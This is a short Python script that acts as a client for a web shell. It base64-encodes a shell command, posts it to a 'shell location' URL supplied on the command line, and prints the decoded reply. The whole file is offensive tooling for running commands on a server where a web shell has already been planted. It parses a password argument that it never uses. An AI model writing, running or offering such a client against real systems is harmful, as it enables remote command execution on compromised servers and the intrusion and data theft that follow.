import requests as req
import argparse, base64

def interact(host, cmd):
    resp = req.post(host, json = {'payload': (base64.b64encode(cmd.encode('ascii'))).decode('ascii')})
    print(base64.b64decode(resp.content).decode('ascii'))
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("-c", "--command", help="command")
    p.add_argument("-d", "--dest", help="shell location")
    p.add_argument("-p", "--password", help="shell password")
    args = p.parse_args()
    shell_location, command, password = args.dest, args.command, args.password
    interact(shell_location, command)
        